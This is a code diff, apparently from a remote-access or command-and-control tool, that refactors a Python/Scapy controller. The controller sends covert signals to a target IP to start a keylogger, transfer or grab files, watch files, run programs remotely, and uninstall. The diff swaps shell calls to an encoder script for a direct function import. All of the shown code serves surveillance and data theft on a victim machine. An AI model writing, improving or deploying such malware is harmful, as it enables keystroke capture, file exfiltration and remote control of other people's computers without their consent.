@@ -5,6 +5,7 @@ from scapy.all import sniff, TCP, send, IP, Raw, conf
 import sys
 import socket
 import time
+from encoder import main as encoder_main
 
 # Disable Scapy verbose mode
 conf.verb = 0
@@ -37,7 +38,7 @@ def get_local_ip():
 
 def send_signal(signal):
     """Send a signal using the encoder script."""
-    os.system(f"python3 encoder.py {signal}:{dest_ip}")
+    encoder_main(f"{signal}:{dest_ip}")
 
 def start_keylogger():
     """Start the keylogger by sending the start signal."""
@@ -56,18 +57,18 @@ def start_file_transfer(file_path):
     """Start the file transfer by sending the file transfer signal."""
     global current_signal
     current_signal = "FT"
-    os.system(f"python3 encoder.py FT:{dest_ip} {file_path}")
+    encoder_main(f"FT:{dest_ip}", file_path)
     print("File transfer signal sent.")
 
 def start_file_grabber(file_path):
     global current_signal
     current_signal = "GRAB"
-    os.system(f"python3 encoder.py GRAB:{dest_ip} {file_path}")
+    encoder_main(f"GRAB:{dest_ip}", file_path)
     print("File grabber signal sent.")
     start_sniffing(False)
     
 def start_watcher(file_path):
-    os.system(f"python3 encoder.py WT_START:{dest_ip} {file_path}")
+    encoder_main(f"WT_START:{dest_ip}", file_path)
     print("Watcher signal sent.")
     start_sniffing()
     print("Press Enter to stop the watcher.")
@@ -77,13 +78,13 @@ def start_watcher(file_path):
 def start_runner(program):
     global current_signal
     current_signal = "RUN"
-    os.system(f"python3 encoder.py RUN:{dest_ip} {program}")
+    encoder_main(f"RUN:{dest_ip}", program)
     print("Run signal sent.")
     start_sniffing()
 
 def uninstall():
     """Uninstall the program by sending the uninstall signal."""
-    os.system(f"python3 encoder.py UNINSTALL:{dest_ip}")
+    encoder_main(f"UNINSTALL:{dest_ip}")
     print("Uninstall signal sent.")
     sys.exit(0)
 
